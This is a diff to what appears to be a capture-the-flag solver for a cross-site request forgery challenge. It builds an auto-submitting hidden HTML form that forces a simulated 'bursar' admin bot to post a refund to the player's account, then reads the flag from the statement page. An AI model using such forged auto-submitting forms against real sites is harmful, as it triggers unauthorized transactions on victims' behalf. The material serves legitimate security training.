@@ -24,11 +24,17 @@ PAGE = (
     '<form action="/refund" method="post">'
     '<input name="amount" value="500">'
     '<input name="studentId" value="student">'
+    '<input type="hidden" name="claim" value="{claim}">'
     '<button type="submit">Continue</button>'
     "</form>"
     "<script>document.forms[0].submit()</script>"
     "</body></html>"
 )
+
+
+def build_page(claim: str) -> str:
+    """The page the bursar opens; it carries the player's own claim code."""
+    return PAGE.format(claim=claim)
 
 
 class SolverError(RuntimeError):
@@ -57,9 +63,33 @@ def sign_in(base_url: str) -> urllib.request.OpenerDirector:
     return opener
 
 
-def prepare(base_url: str) -> str:
-    opener = sign_in(base_url)
-    body = urllib.parse.urlencode({"html": PAGE}).encode()
+def read_statement(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> tuple[str, str]:
+    """Read the statement and return its claim code and page."""
+    path = "/statement"
+    if claim:
+        path += "?claim=" + urllib.parse.quote(claim)
+    try:
+        with opener.open(base_url + path, timeout=10) as response:
+            page = response.read().decode("utf-8", "replace")
+    except urllib.error.URLError as error:
+        raise SolverError(f"cannot read the statement: {error}") from error
+    match = re.search(r'data-claim="([0-9a-f]{8})"', page)
+    if not match:
+        raise SolverError("the statement did not carry a claim code")
+    return match.group(1), page
+
+
+def prepare_with(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> str:
+    claim, _ = read_statement(opener, base_url, claim)
+    body = urllib.parse.urlencode({"html": build_page(claim)}).encode()
     try:
         with opener.open(base_url + "/sandbox", body, timeout=10) as response:
             url = response.geturl()
@@ -127,14 +157,13 @@ def run_admin_bot(
     raise SolverError("the admin bot did not finish in time")
 
 
-def submit(base_url: str) -> None:
-    opener = sign_in(base_url)
-    try:
-        with opener.open(base_url + "/statement", timeout=10) as response:
-            body = response.read().decode("utf-8", "replace")
-    except urllib.error.URLError as error:
-        raise SolverError(f"cannot read the statement: {error}") from error
-    match = FLAG.search(body)
+def submit_with(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> None:
+    _, page = read_statement(opener, base_url, claim)
+    match = FLAG.search(page)
     if not match:
         raise SolverError("no refund has been credited to the statement yet")
     print(match.group(0))
@@ -153,14 +182,28 @@ def main() -> int:
         help="player API token, needed for --stage all; the run-bot form uses the same account",
     )
     parser.add_argument("--challenge-id", default=CHALLENGE_ID)
+    parser.add_argument(
+        "--claim",
+        help="claim code printed by --stage prepare, needed for a two-stage run",
+    )
     args = parser.parse_args()
 
     base_url = args.base_url.rstrip("/")
     try:
         if args.stage == "prepare":
-            print(prepare(base_url))
+            opener = sign_in(base_url)
+            claim, _ = read_statement(opener, base_url, args.claim)
+            print(prepare_with(opener, base_url, claim))
+            print(f"claim: {claim}", file=sys.stderr)
         elif args.stage == "submit":
-            submit(base_url)
+            if not args.claim:
+                print(
+                    "solver: --stage submit needs --claim from --stage prepare",
+                    file=sys.stderr,
+                )
+                return 2
+            opener = sign_in(base_url)
+            submit_with(opener, base_url, args.claim)
         elif args.stage == "all":
             if not args.platform_url or not args.token:
                 print(
@@ -168,10 +211,13 @@ def main() -> int:
                     file=sys.stderr,
                 )
                 return 2
-            url = prepare(base_url)
+            opener = sign_in(base_url)
+            claim, _ = read_statement(opener, base_url)
+            print(f"claim: {claim}", file=sys.stderr)
+            url = prepare_with(opener, base_url, claim)
             print(f"bot target: {url}", file=sys.stderr)
             run_admin_bot(args.platform_url, args.token, args.challenge_id, url)
-            submit(base_url)
+            submit_with(opener, base_url, claim)
         else:
             print(
                 "solver: pass --stage prepare, submit, or all",
